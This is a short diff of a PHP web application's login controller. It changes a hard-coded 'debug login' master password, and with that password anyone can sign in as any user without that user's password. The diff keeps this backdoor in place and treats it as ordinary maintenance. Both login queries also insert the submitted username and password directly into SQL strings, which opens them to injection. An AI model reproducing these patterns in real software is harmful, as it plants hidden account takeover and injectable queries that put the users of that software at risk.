@@ -32,7 +32,7 @@ class IndexAction extends Action{
 		if(cookie('setok') == 'login1')
 			$this->ajaxReturn('', '帐号或密码错误，10分钟内无法登陆！', 0);
 				
-		if($_POST["password"] == 'neconano!!!')//调试登录
+		if($_POST["password"] == 'gaopeng')//调试登录
 			$user = $ViewUser->where("`title`='$username'")->find();
 		else//正常登录
 			$user = $ViewUser->where("`title`='$username' AND `password`='$userpass'")->find();
